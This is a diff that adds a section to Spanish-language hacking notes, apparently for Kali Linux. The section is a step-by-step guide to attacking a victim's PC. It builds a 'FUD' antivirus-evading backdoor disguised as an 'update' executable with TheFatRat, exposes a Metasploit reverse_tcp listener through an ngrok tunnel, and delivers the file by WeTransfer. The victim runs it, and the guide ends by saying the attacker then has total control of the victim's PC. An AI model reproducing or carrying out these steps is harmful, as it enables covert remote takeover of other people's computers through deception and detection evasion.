@@ -654,6 +654,38 @@ rmdir <nombre directorio> (Borrar directorio)
 --- Nos aparecerá un mensaje indicando que 1 sesión ha sido abierta
 
 
+++ Crear archivo malicioso y usarlo fuera de la red local
+--- Descargar ngrok URL: https://ngrok.com/downloads/linux
+--- Ir a la terminal ejecutar los siguientes comandos:
+--- ls
+--- unzip <nombre_archivo_ngrok>
+--- mv <nombre_carpeta_descomprimida_ngrok> /usr /bin (Permite mover los archivos de ngrok para que puedan ser ejecutados desde cualquier ubicación usando la terminal
+--- ngrok tcp 8080
+--- Enter
+--- Abrir otra terminal para usar fatrat, ejecutar los siguientes comandos
+--- fatrat
+--- Seleccionar la opción 6 (Create Fud Backdoor 1000% with PwnWinds)
+--- Seleccionar la opción 2 (Create exe file with C # + Powershell)
+--- Se nos pedirá el LHOST, este lo obtenemos de la otra terminal de ngrok (sección forwarding, ejemplo: 0.tcp.ngrok.io)
+--- Se nos pedirá el LPORT, este lo obtenemos de la otra terminal de ngrok (sección forwarding, ejemplo: 12171)
+--- Colocar el nombre del archivo, ejemplo: update
+--- Seleccionar la opción 3 (windows/meterpreter/reverse_tcp)
+--- Presionar enter para generar el archivo
+--- El archivo se guardará en el directorio output de fatrat
+--- Ahora procederemos a configurar el listener
+--- Ejecutar los siguientes comandos
+--- msfconsole
+--- use exploit/multi/handler
+--- set payload windows/meterpreter/reverse_tcp
+--- set lhost localhost
+--- set lport 8080
+--- run
+--- Usar un servicio de nube para subir el archivo, ejemplo: https://wetransfer.com/
+--- Subir el archivo malicioso
+--- Ir a la pc de la víctima, acceder al enlace, descargar y ejecutar el archivo
+--- Volver a la pc con kali, a la terminal de listener, se nos mostrará un mensaje indicando que existe 1 sesion abierta
+--- En este punto se tiene control total de la pc de la víctima
+
 
 
 
